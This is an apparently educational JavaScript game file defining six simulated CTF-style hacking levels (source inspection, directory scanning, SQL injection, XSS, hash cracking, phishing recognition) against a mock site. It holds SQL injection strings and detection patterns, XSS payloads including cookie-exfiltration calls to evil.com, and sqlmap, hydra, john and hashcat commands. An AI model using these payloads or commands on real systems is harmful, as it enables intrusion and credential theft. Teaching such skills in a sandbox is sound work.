/**
 * levels.js - 关卡数据和游戏逻辑
 */

const Levels = [
  // ========== 第1关：源码探秘 ==========
  {
    id: 1,
    name: '源码探秘',
    brief: '目标网站上线不久，开发者似乎在前端代码中留下了一些不该出现的东西。你的第一个任务很简单——找到它。',
    target: '在网页源代码中找到隐藏的 flag',
    hint: '试试用 view-source 或者 curl 查看页面源代码，注意 HTML 注释...',
    flag: 'FLAG{v1ew_s0urc3_is_your_f1rst_st3p}',
    baseScore: 100,

    // 模拟的网页
    pages: {
      'http://target.site/': {
        content: `<html>
<head><title>Target Corp - 首页</title></head>
<body>
  <h1>欢迎来到 Target Corp</h1>
  <p>我们致力于提供最安全的服务。</p>
  <!-- TODO: 删除上线前的测试信息 -->
  <!-- debug: admin panel at /admin -->
  <!-- FLAG{v1ew_s0urc3_is_your_f1rst_st3p} -->
  <footer>© 2026 Target Corp</footer>
</body>
</html>`
      },
      'http://target.site/admin': {
        content: `<html><body><h1>403 Forbidden</h1><p>Access Denied</p></body></html>`
      }
    },

    hints: [
      { trigger: 'view-source:http://target.site/', content: 'HTML 注释中包含了敏感信息...' },
      { trigger: 'curl http://target.site/', content: '仔细看看输出中的注释部分...' }
    ]
  },

  // ========== 第2关：目录扫描 ==========
  {
    id: 2,
    name: '目录扫描',
    brief: '目标网站的管理员声称"该藏的都藏好了"。但真的是这样吗？用目录枚举工具扫描一下，看看有没有被遗忘的入口。',
    target: '找到隐藏的管理页面，获取 flag',
    hint: '使用 dirb http://target.site/ 进行目录扫描',
    flag: 'FLAG{h1dd3n_d1r3ct0r1es_3xp0sed}',
    baseScore: 150,

    pages: {
      'http://target.site/': {
        content: `<html><head><title>SecureApp</title></head>
<body><h1>SecureApp v2.0</h1><p>Nothing to see here.</p></body></html>`
      },
      'http://target.site/robots.txt': {
        content: `User-agent: *
Disallow: /admin/
Disallow: /backup/
Disallow: /secret_panel/
Disallow: /.env`
      },
      'http://target.site/secret_panel/': {
        content: `<html><head><title>管理面板</title></head>
<body>
  <h1>🔒 管理面板</h1>
  <p>欢迎回来，管理员。</p>
  <div style="background:#1a1a2e;padding:20px;border:1px solid #ff9800;margin:20px 0;">
    <code>FLAG{h1dd3n_d1r3ct0r1es_3xp0sed}</code>
  </div>
  <p><small>注意：此页面不应被公开访问</small></p>
</body></html>`
      },
      'http://target.site/backup/': {
        content: `<html><body><h1>Index of /backup/</h1>
<ul><li>db_backup_2026.sql</li><li>config.old</li></ul></body></html>`
      },
      'http://target.site/.env': {
        content: `DB_HOST=localhost
DB_USER=admin
DB_PASS=supersecret123
# 注意：此文件不应暴露`
      }
    },

    hints: [
      { trigger: 'robots.txt', content: 'robots.txt 里藏了什么？试试访问 Disallow 的路径...' },
      { trigger: 'secret_panel', content: '找到了！查看页面内容获取 flag。' }
    ]
  },

  // ========== 第3关：SQL 注入 ==========
  {
    id: 3,
    name: 'SQL 注入',
    brief: '目标站点的登录页面似乎没有对用户输入做充分过滤。尝试利用 SQL 注入漏洞绕过认证。',
    target: '使用 SQL 注入绕过登录，获取管理员权限',
    hint: '试试在用户名输入 admin\' OR 1=1 -- ，或者用 sqlmap 自动化',
    flag: 'FLAG{sql_1nj3ct10n_byp4ss_auth}',
    baseScore: 200,

    pages: {
      'http://target.site/login': {
        content: `<html><head><title>登录</title></head>
<body>
  <form method="POST" action="/login">
    <label>用户名: <input type="text" name="username"></label><br>
    <label>密　码: <input type="password" name="password"></label><br>
    <button type="submit">登录</button>
  </form>
</body></html>`
      }
    },

    // SQL 注入逻辑
    loginAttempts: [],

    tryLogin(username, password) {
      // 模拟 SQL 注入检测
      const injectionPatterns = [
        /'\s*or\s+1\s*=\s*1/i,
        /"\s*or\s+1\s*=\s*1/i,
        /'\s*or\s+'1'\s*=\s*'1/i,
        /admin'\s*--/i,
        /'\s*;\s*drop/i,
        /'\s*union\s+select/i,
        /'\s*or\s+true/i,
        /1'\s*or\s*'1'\s*=\s*'1/i,
        /'\s*or\s*1\s*#/,
        /'\s*or\s+1=1\s*#/,
        /'\s*or\s+1=1\s*--/,
      ];

      const input = `${username} ${password}`;
      const isInjection = injectionPatterns.some(p => p.test(input));

      if (isInjection) {
        return { success: true, type: 'injection' };
      }
      if (username === 'admin' && password === 'admin123') {
        return { success: true, type: 'normal' };
      }
      return { success: false };
    },

    hints: [
      { trigger: 'sqlmap', content: 'sqlmap -u http://target.site/login --data="username=admin&password=test" --level=3' },
      { trigger: 'OR 1=1', content: 'SQL 注入的关键是让 WHERE 条件永远为真...' }
    ]
  },

  // ========== 第4关：XSS 攻击 ==========
  {
    id: 4,
    name: 'XSS 攻击',
    brief: '目标网站有一个搜索功能，似乎没有对用户输入做过滤。尝试构造一个 XSS payload，当管理员访问时会泄露他的 cookie。',
    target: '构造 XSS payload 窃取管理员 cookie',
    hint: '试试在搜索框输入 <script>alert(1)</script> 看看有没有弹窗',
    flag: 'FLAG{xss_c00k13_th3ft_succ3ss}',
    baseScore: 250,

    pages: {
      'http://target.site/search': {
        content: `<html><head><title>搜索</title></head>
<body>
  <form method="GET" action="/search">
    <input type="text" name="q" placeholder="搜索...">
    <button type="submit">搜索</button>
  </form>
  <div id="results"></div>
</body></html>`
      }
    },

    xssPayloads: [
      '<script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
      '"><script>alert(document.cookie)</script>',
      "'-alert(1)-'",
      '<body onload=alert(1)>',
      '<iframe src="javascript:alert(1)">',
      '<input onfocus=alert(1) autofocus>',
      '<details open ontoggle=alert(1)>',
      '<script>fetch("http://evil.com?c="+document.cookie)</script>',
      '<img src=x onerror=fetch("http://evil.com?c="+document.cookie)>',
    ],

    checkXSS(input) {
      const lower = input.toLowerCase();
      // 检查是否包含有效的 XSS payload
      const hasScript = /<script/i.test(input) || /onerror\s*=/i.test(input) ||
        /onload\s*=/i.test(input) || /onfocus\s*=/i.test(input) ||
        /ontoggle\s*=/i.test(input) || /javascript:/i.test(input);

      const hasCookieAccess = /document\.cookie/i.test(input);
      const hasAlert = /alert\s*\(/i.test(input);
      const hasFetch = /fetch\s*\(/i.test(input) || /XMLHttpRequest/i.test(input);

      if (hasScript && (hasCookieAccess || hasAlert)) {
        return { success: true, type: 'cookie_theft' };
      }
      if (hasScript && (hasFetch)) {
        return { success: true, type: 'data_exfil' };
      }
      if (hasScript) {
        return { success: false, partial: true };
      }
      return { success: false };
    },

    hints: [
      { trigger: 'script', content: '<script>alert(1)</script> 是最基础的 XSS payload，试试能不能执行...' },
      { trigger: 'cookie', content: '要窃取 cookie，需要用 document.cookie 获取，然后发送到攻击者服务器...' }
    ]
  },

  // ========== 第5关：密码破解 ==========
  {
    id: 5,
    name: '密码破解',
    brief: '你获取到了一个密码哈希值。管理员的密码强度似乎不高，尝试用字典攻击或暴力破解来恢复明文密码。',
    target: '破解 MD5 哈希，还原管理员密码',
    hint: '常见弱密码：123456、password、admin123、qwerty...',
    flag: 'FLAG{w3ak_p4ssw0rd_cr4ck3d}',
    baseScore: 200,

    // 目标哈希和密码
    targetHash: 'e10adc3949ba59abbe56e057f20f883e', // 123456
    password: '123456',

    // 常见密码字典
    dictionary: [
      '123456', 'password', '12345678', 'qwerty', '123456789',
      '12345', '1234', '111111', '1234567', 'dragon',
      '123123', 'baseball', 'abc123', 'football', 'monkey',
      'letmein', 'shadow', 'master', '666666', 'qwertyuiop',
      '123321', 'mustang', '1234567890', 'michael', '654321',
      'admin', 'admin123', 'root', 'toor', 'pass',
      'test', 'guest', 'master', 'changeme', 'password123'
    ],

    checkPassword(input) {
      return input.toLowerCase() === this.password;
    },

    hints: [
      { trigger: 'hydra', content: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt target.site ssh' },
      { trigger: 'john', content: 'john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt' },
      { trigger: 'hashcat', content: 'hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt' }
    ]
  },

  // ========== 第6关：社会工程 ==========
  {
    id: 6,
    name: '社会工程',
    brief: '恭喜你走到最后一关。这次不是技术挑战，而是心理战。你收到了一封来自"IT部门"的邮件，要求你点击链接重置密码。但真的是 IT 部门发的吗？',
    target: '识别钓鱼邮件中的可疑线索，找到真正的 flag',
    hint: '仔细检查：发件人地址、链接URL、邮件语气、拼写错误...',
    flag: 'FLAG{s0c14l_3ng1n33r1ng_4w4r3n3ss}',
    baseScore: 300,

    // 钓鱼邮件数据
    emails: [
      {
        id: 1,
        from: 'IT-Support@target-corp.com',  // 注意：不是 target.site
        fromDisplay: 'IT 技术支持',
        subject: '【紧急】密码过期通知 - 请立即重置',
        date: '2026-03-15 09:23',
        body: `尊敬的员工：

我们的安全系统检测到您的密码将在24小时内过期。为避免账户被锁定，请立即点击以下链接重置密码：

👉 http://target-corp.com/reset-password?user=admin&token=abc123

如不及时处理，您的账户将被临时冻结。

此致
IT 技术支持部门
Target Corp

注意：本邮件由系统自动发送，请勿回复。`,
        suspicious: true,
        clues: [
          '发件人域名是 target-corp.com，不是 target.site',
          '链接指向的域名也是 target-corp.com（钓鱼域名）',
          '"紧急"、"立即"、"账户冻结"等制造恐慌的措辞',
          '正规 IT 部门不会通过邮件发送重置链接',
          '没有具体称呼（"尊敬的员工"而非你的名字）'
        ]
      },
      {
        id: 2,
        from: 'hr@target.site',
        fromDisplay: '人力资源部',
        subject: '3月团建活动通知',
        date: '2026-03-14 16:45',
        body: `各位同事：

本月团建活动定于3月20日（周三）下午2点，在公司三楼会议室举行。

活动内容：
1. 团队破冰游戏
2. 季度优秀员工颁奖
3. 自由交流时间

请各位准时参加。如有特殊情况请提前告知。

人力资源部`,
        suspicious: false,
        clues: []
      },
      {
        id: 3,
        from: 'no-reply@target.site',
        fromDisplay: '系统通知',
        subject: '【安全提醒】检测到异常登录',
        date: '2026-03-15 11:02',
        body: `安全提醒

您的账户于 2026-03-15 10:58 从一个新设备登录。

设备：Windows 10 / Chrome 122
IP 地址：203.0.113.42
位置：北京市

如果这是您本人的操作，请忽略此邮件。
如果这不是您本人的操作，请立即联系 IT 部门。

--
Target Corp 安全团队`,
        suspicious: false,
        clues: []
      },
      {
        id: 4,
        from: 'ceo@target.site',
        fromDisplay: '张总 (CEO)',
        subject: '帮忙处理一下',
        date: '2026-03-15 14:30',
        body: `你好：

我现在在开会，不方便打电话。帮我买5张京东电子礼品卡，每张500元，先垫付，回头报销。

买完把卡密发我微信就行，急用，谢谢！

张总`,
        suspicious: true,
        clues: [
          'CEO 直接要求员工垫钱买礼品卡——典型的 CEO 欺诈',
          '制造紧迫感（"急用"、"在开会"）',
          '要求通过微信发送卡密——绕过公司流程',
          '没有具体称呼，语气不像是真正的 CEO',
          '正规公司不会让员工个人垫付采购费用'
        ]
      }
    ],

    // 分析命令处理
    analyzeEmail(emailId, clueIndex) {
      const email = this.emails.find(e => e.id === emailId);
      if (!email) return null;
      if (clueIndex !== undefined && email.clues[clueIndex]) {
        return { clue: email.clues[clueIndex] };
      }
      return email;
    }
  }
];

// 成就定义
const Achievements = {
  // 每关通关成就（必得）
  LVL1_CLEAR: { id: 'lvl1_clear', name: '源码探秘', icon: '📄', desc: '完成第1关：源码探秘' },
  LVL2_CLEAR: { id: 'lvl2_clear', name: '目录猎手', icon: '🔍', desc: '完成第2关：目录扫描' },
  LVL3_CLEAR: { id: 'lvl3_clear', name: '注入突破', icon: '💉', desc: '完成第3关：SQL注入' },
  LVL4_CLEAR: { id: 'lvl4_clear', name: 'XSS 攻克', icon: '⚡', desc: '完成第4关：XSS攻击' },
  LVL5_CLEAR: { id: 'lvl5_clear', name: '密码破译', icon: '🔑', desc: '完成第5关：密码破解' },
  LVL6_CLEAR: { id: 'lvl6_clear', name: '火眼金睛', icon: '👁️', desc: '完成第6关：社会工程' },
  // 额外成就（奖励）
  DIR_HUNTER: { id: 'dir_hunter', name: '扫描达人', icon: '📡', desc: '一次扫描就找到隐藏目录' },
  SQL_PRO: { id: 'sql_pro', name: 'SQL 专家', icon: '🗃️', desc: '手写 SQL 注入绕过认证' },
  XSS_MASTER: { id: 'xss_master', name: 'XSS 大师', icon: '🎯', desc: '一次构造出完美的 XSS payload' },
  PWD_HUNTER: { id: 'pwd_hunter', name: '暴力破解', icon: '🔨', desc: '成功破解密码哈希' },
  PHISH_SPOTTER: { id: 'phish_spotter', name: '反钓鱼专家', icon: '🎣', desc: '4封邮件全部判定正确' },
  PERCEPTION: { id: 'perception', name: '社工嗅觉', icon: '🕵️', desc: '识别出 CEO 欺诈邮件' },
  NO_HINTS: { id: 'no_hints', name: '独立自主', icon: '🧠', desc: '不使用任何提示通关' },
  // 全局
  ALL_CLEAR: { id: 'all_clear', name: '全面渗透', icon: '🏆', desc: '通关所有关卡' },
};

// 关卡通关成就映射
const LevelClearAchievements = [
  Achievements.LVL1_CLEAR,
  Achievements.LVL2_CLEAR,
  Achievements.LVL3_CLEAR,
  Achievements.LVL4_CLEAR,
  Achievements.LVL5_CLEAR,
  Achievements.LVL6_CLEAR,
];

// 游戏状态管理
const GameState = {
  currentLevel: 0,
  score: 0,
  levelStartTime: 0,
  hintsUsed: 0,
  achievements: [],
  levelScores: [],
  commandHistory: [],
  historyIndex: -1,

  // 临时状态（每关重置）
  tempState: {},

  save() {
    localStorage.setItem('cyberhack_state', JSON.stringify({
      currentLevel: this.currentLevel,
      score: this.score,
      achievements: this.achievements,
      levelScores: this.levelScores,
    }));
  },

  load() {
    const saved = localStorage.getItem('cyberhack_state');
    if (saved) {
      const data = JSON.parse(saved);
      Object.assign(this, data);
    }
  },

  reset() {
    this.currentLevel = 0;
    this.score = 0;
    this.levelStartTime = 0;
    this.hintsUsed = 0;
    this.achievements = [];
    this.levelScores = [];
    this.tempState = {};
    this.save();
  },

  addAchievement(achievement) {
    if (!this.achievements.find(a => a.id === achievement.id)) {
      this.achievements.push(achievement);
      return true;
    }
    return false;
  },

  getCurrentLevel() {
    return Levels[this.currentLevel];
  }
};
